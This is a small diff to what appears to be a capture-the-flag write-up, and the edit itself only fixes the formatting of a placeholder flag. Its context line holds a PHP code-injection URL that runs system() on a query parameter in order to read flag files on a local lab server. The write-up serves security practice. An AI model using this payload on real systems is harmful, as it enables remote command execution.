@@ -240,7 +240,7 @@ http://localhost:8082/?format=${system($_GET[cmd])}&cmd=cat%20/fl*
 
 
 ## Get FLAG
-**FLAG: **CHW{7hi5_1s_f4k3_fl4g}**
+**FLAG: CHW{7hi5_1s_f4k3_fl4g}**
 
 # cmdi
 ![image](https://hackmd.io/_uploads/r1Ecs7_0C.png)
